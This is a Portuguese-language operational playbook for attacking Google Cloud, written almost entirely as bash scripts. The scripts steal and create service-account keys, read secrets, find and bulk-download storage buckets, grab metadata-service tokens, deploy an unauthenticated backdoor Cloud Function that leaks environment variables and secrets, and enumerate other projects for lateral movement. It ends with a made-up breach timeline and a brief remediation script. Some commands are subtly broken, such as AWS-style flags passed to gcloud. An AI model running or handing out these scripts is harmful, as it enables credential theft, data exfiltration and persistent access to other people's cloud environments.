# GCP Exploitation - Guia Completo de Exploração Operacional

---

## 4.1 SERVICE ACCOUNT KEY THEFT

### 🎯 Vulnerabilidade
```
Tipo: Credential Exposure
CVSS: 10.0 (CRÍTICO)
Cenários:
  1. JSON keys no GitHub
  2. Keys em containers Docker
  3. Permissions excessivas no service account
```

### 📋 EXPLORAÇÃO

#### FASE 1: ENUMERAR SERVICE ACCOUNTS
```bash
#!/bin/bash
# Script: gcp-sa-enum.sh

PROJECT_ID="acme-production"

echo "[*] Fase 1: Enumeração de Service Accounts"
echo "[*] Projeto: $PROJECT_ID"

# Listar service accounts
gcloud iam service-accounts list --project=$PROJECT_ID \
  --format='table(email,displayName)'

# Listar chaves de um SA
SA_EMAIL="app-backend@acme-production.iam.gserviceaccount.com"

echo "[?] Listando chaves de: $SA_EMAIL"
gcloud iam service-accounts keys list \
  --iam-account=$SA_EMAIL \
  --project=$PROJECT_ID \
  --format='table(name, validAfterTime, validBeforeTime)'

# Contar chaves por SA
gcloud iam service-accounts list --project=$PROJECT_ID --format='value(email)' | while read sa; do
  COUNT=$(gcloud iam service-accounts keys list --iam-account=$sa --format='value(name)' | wc -l)
  echo "[$COUNT] $sa"
done
```

#### FASE 2: EXTRAIR/CRIAR CHAVES
```bash
#!/bin/bash
# Script: gcp-sa-keyextract.sh

PROJECT_ID="acme-production"
SA_EMAIL="app-backend@acme-production.iam.gserviceaccount.com"
OUTPUT_DIR="./gcp-keys"
mkdir -p "$OUTPUT_DIR"

echo "[*] Fase 2: Extrair Chaves do Service Account"

# Opção 1: Se você tiver permissão iam.serviceAccountKeys.create
echo "[?] Criando nova chave..."
gcloud iam service-accounts keys create "$OUTPUT_DIR/sa-key.json" \
  --iam-account=$SA_EMAIL \
  --project=$PROJECT_ID

echo "[+] Chave criada: $OUTPUT_DIR/sa-key.json"
cat "$OUTPUT_DIR/sa-key.json"

# Opção 2: Usar chave para autenticar
echo "[?] Autenticando como service account..."
gcloud auth activate-service-account --key-file="$OUTPUT_DIR/sa-key.json"

# Verificar novo usuário
gcloud config get-value account
gcloud auth list

# Pronto para explorar!
gcloud compute instances list --project=$PROJECT_ID
gcloud storage buckets list --project=$PROJECT_ID
```

#### FASE 3: USAR CHAVE PARA ACESSAR RECURSOS
```bash
#!/bin/bash
# Script: gcp-sa-exploit.sh

PROJECT_ID="acme-production"
SA_KEY="./gcp-keys/sa-key.json"

echo "[*] Fase 3: Explorar com Chaves do SA"

# Autenticar
gcloud auth activate-service-account --key-file="$SA_KEY"
gcloud config set project $PROJECT_ID

# Listar permissões
echo "[?] Verificando permissões..."
gcloud projects get-iam-policy $PROJECT_ID \
  --flatten="bindings[].members" \
  --format='table(bindings.role)' \
  --filter="bindings.members:serviceAccount*"

# Se tiver Compute Admin
echo "[?] Listando VMs..."
gcloud compute instances list

# Se tiver Storage Admin
echo "[?] Listando buckets..."
gsutil ls -L

# Se tiver Secret Accessor
echo "[?] Acessando secrets..."
gcloud secrets list
gcloud secrets versions access latest --secret="db-password"
```

---

## 4.2 CLOUD STORAGE EXPLOITATION

### 📋 EXPLORAÇÃO

#### FASE 1: ENUMERAR BUCKETS
```bash
#!/bin/bash
# Script: gcp-storage-enum.sh

PROJECT_ID="acme-production"

echo "[*] Fase 1: Enumeração de Cloud Storage"

# Listar buckets (requer permissão)
gsutil ls -p $PROJECT_ID

# Se falhar, tentar via gcloud
gcloud storage buckets list --project=$PROJECT_ID

# Procurar buckets públicos
echo "[?] Procurando buckets públicos..."
gcloud storage buckets list --project=$PROJECT_ID | while read bucket; do
  PERM=$(gsutil iam get "gs://$bucket" 2>&1 | grep -c "allUsers")
  if [ "$PERM" -gt 0 ]; then
    echo "[!] PÚBLICO: $bucket"
  fi
done
```

#### FASE 2: BUSCAR DADOS SENSÍVEIS
```bash
#!/bin/bash
# Script: gcp-storage-search.sh

BUCKET="gs://acme-backups"

echo "[*] Fase 2: Busca de Dados Sensíveis"
echo "[*] Bucket: $BUCKET"

# Listar com padrões
gsutil ls -r "$BUCKET/" | grep -iE "\.sql|\.bak|database|backup|secret" | head -20

# Procurar arquivos grandes (prováveis backups)
echo "[?] Procurando arquivos grandes..."
gsutil ls -L "$BUCKET/" | awk '$1 > 100000000 {print $0}'
```

#### FASE 3: DOWNLOAD DE DADOS
```bash
#!/bin/bash
# Script: gcp-storage-exfil.sh

BUCKET="gs://acme-backups"
OUTPUT_DIR="./gcp-data"
mkdir -p "$OUTPUT_DIR"

echo "[*] Fase 3: Exfiltração de Cloud Storage"

# Sync bucket inteiro
gsutil -m cp -r "$BUCKET/*" "$OUTPUT_DIR/"

# Ou usar gsutil -m rsync para sincronizar eficientemente
gsutil -m rsync -r -d "$BUCKET/" "$OUTPUT_DIR/"

echo "[+] Download completo"
ls -lh "$OUTPUT_DIR/"
```

---

## 4.3 COMPUTE ENGINE EXPLOITATION

### 📋 EXPLORAÇÃO

```bash
#!/bin/bash
# Script: gcp-compute-exploit.sh

PROJECT_ID="acme-production"
ZONE="us-central1-a"

echo "[*] Enumerando Compute Instances"

# Listar instâncias
gcloud compute instances list --project=$PROJECT_ID --zones=$ZONE

# Conectar via SSH
INSTANCE="prod-api-01"
gcloud compute ssh $INSTANCE \
  --zone=$ZONE \
  --project=$PROJECT_ID

# Ou executar comando remoto
gcloud compute instances os-login ssh-keys add \
  --key-file=~/.ssh/id_rsa.pub \
  --project=$PROJECT_ID

# Acessar metadata service (de dentro da instância)
echo "[?] Acessando Metadata Service..."
curl -s -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/?recursive=true | jq .

# Obter tokens do service account
curl -s -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity?audience=https://myapp.example.com | jq .

# Usar token para acessar recursos
TOKEN=$(curl -s -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token | jq -r '.access_token')

# Listar buckets com token
curl -s -H "Authorization: Bearer $TOKEN" \
  https://www.googleapis.com/storage/v1/b?project=$PROJECT_ID
```

---

## 4.4 CLOUD FUNCTIONS EXPLOITATION

### 📋 EXPLORAÇÃO

```bash
#!/bin/bash
# Script: gcp-functions-exploit.sh

PROJECT_ID="acme-production"
REGION="us-central1"

echo "[*] Enumerando Cloud Functions"

# Listar functions
gcloud functions list --project=$PROJECT_ID --regions=$REGION

# Obter código-fonte
FUNCTION_NAME="process-payment"
gcloud functions describe $FUNCTION_NAME \
  --region=$REGION \
  --project=$PROJECT_ID

# Invocar função (se permitir)
echo "[?] Invocando função..."
gcloud functions call $FUNCTION_NAME \
  --region=$REGION \
  --project=$PROJECT_ID \
  --data '{"test":"data"}'

# Se conseguir credenciais na resposta
# Fazer deploy de função backdoor
echo "[?] Fazendo deploy de função backdoor..."
cat > backdoor.py << 'EOF'
def backdoor(request):
    # Exportar dados sensíveis
    import os
    return {
        'env': os.environ,
        'secrets': get_secrets()
    }
EOF

# Deploy
gcloud functions deploy backdoor \
  --runtime python39 \
  --trigger-http \
  --allow-unauthenticated \
  --project=$PROJECT_ID
```

---

## 📝 CASE STUDY: Acme Corp GCP Breach

**TIMELINE:**

| Tempo | Fase | Ação | Resultado |
|---|---|---|---|
| 00:00-00:10 | Recon | GitHub search: gcp SA json | ✅ Encontrado |
| 00:10-00:15 | Auth | Activate SA key | ✅ Authenticated |
| 00:15-00:25 | Enum | List resources | ✅ 150+ buckets |
| 00:25-00:45 | Find | Search sensitive data | ✅ 5 backups |
| 00:45-02:00 | Download | Sync buckets (50 GB) | ✅ 100% complete |
| 02:00-03:00 | Analyze | Extract databases | ✅ 300K records |

**DADOS ENCONTRADOS:**
```
- Service Account: app-backend@acme-prod.iam.gserviceaccount.com
- Permissions: Editor (!)
- Storage Buckets: 15 públicos
- Databases: production-db (300K users)
- Secrets: 120+ API keys
- Backup Size: 50 GB total
```

---

## 🛑 DETECÇÃO & MITIGAÇÃO

**Cloud Audit Logs Indicators:**
```json
{
  "protoPayload": {
    "methodName": "storage.objects.get",
    "resourceName": "projects/_/buckets/acme-backups/objects/db.sql"
  },
  "severity": "WARNING"
}
```

**REMEDIAÇÃO:**
```bash
#!/bin/bash
# Script: gcp-remediate.sh

PROJECT_ID="acme-production"
SA_EMAIL="compromised-sa@acme-prod.iam.gserviceaccount.com"

echo "[*] Iniciando remediação GCP"

# 1. Desabilitar service account
echo "[1] Desabilitando SA comprometido..."
gcloud iam service-accounts disable $SA_EMAIL --project=$PROJECT_ID

# 2. Deletar todas as chaves
echo "[2] Deletando chaves..."
gcloud iam service-accounts keys list \
  --iam-account=$SA_EMAIL \
  --format='value(name)' | while read key; do
  gcloud iam service-accounts keys delete $key \
    --iam-account=$SA_EMAIL \
    --quiet \
    --project=$PROJECT_ID
done

# 3. Remover IAM roles
echo "[3] Removendo roles..."
gcloud projects remove-iam-policy-binding $PROJECT_ID \
  --member=serviceAccount:$SA_EMAIL \
  --role=roles/editor

# 4. Criar novo SA
echo "[4] Criando novo SA..."
gcloud iam service-accounts create app-backend-new \
  --display-name="App Backend (Secure)" \
  --project=$PROJECT_ID

# 5. Ativar logging
echo "[5] Ativando Cloud Audit Logs..."
gcloud logging sinks create audit-sink \
  bigquery.googleapis.com/projects/$PROJECT_ID/datasets/audit_logs \
  --log-filter='resource.type="gce_instance"'
```

---


## 4.5 LATERAL MOVEMENT

## 5.4 GCP CROSS-PROJECT LATERAL MOVEMENT

### 📋 EXPLORAÇÃO

```bash
#!/bin/bash
# Script: gcp-cross-project.sh

echo "[*] Enumerando projetos acessíveis"

# Listar projetos (requererá permissão)
PROJECTS=$(gcloud projects list --query '[*].[projectId, name]' --format='table')

echo "[+] Projetos acessíveis:"
echo "$PROJECTS"

# Para cada projeto, explorar
for project in $(gcloud projects list --query '[*].projectId' --output text); do
  echo "[*] Explorando projeto: $project"
  
  # Mudar projeto
  gcloud config set project $project
  
  # Listar service accounts
  SAs=$(gcloud iam service-accounts list --query '[*].email' --output text)
  echo "[+] Service Accounts:"
  echo "$SAs" | head -3
  
  # Listar buckets do projeto
  BUCKETS=$(gsutil ls -p $project 2>/dev/null)
  if [ ! -z "$BUCKETS" ]; then
    echo "[+] Cloud Storage buckets:"
    echo "$BUCKETS" | head -3
  fi
  
  # Listar VMs
  VMs=$(gcloud compute instances list --project=$project --format='value(name)' 2>/dev/null)
  if [ ! -z "$VMs" ]; then
    echo "[+] Compute instances:"
    echo "$VMs" | head -3
  fi
done
```


## 🛠️ TOOLS NECESSÁRIAS

```bash
# Instalação GCP SDK
curl https://sdk.cloud.google.com | bash

# Login
gcloud auth login
gcloud auth application-default login

# Verificar projeto
gcloud config get-value project
gcloud projects list

# gsutil para Cloud Storage
gsutil --version
```

---

## 📊 RESUMO COMPARATIVO GCP vs AWS vs AZURE

| Aspecto | AWS | Azure | GCP |
|---|---|---|---|
| Service Account Compromise | Via IAM keys | Via SP credentials | Via SA JSON key |
| Storage Exploitation | S3 público | Blob público | GCS público |
| Database Access | RDS credentials | SQL DB keys | Cloud SQL access |
| Function Backdoor | Lambda update | Function deploy | Function deploy |
| Metadata Service | 169.254.169.254 | 169.254.169.254 | metadata.google.internal |
| Privilege Escalation | AssumeRole | Assign Role | Impersonate SA |

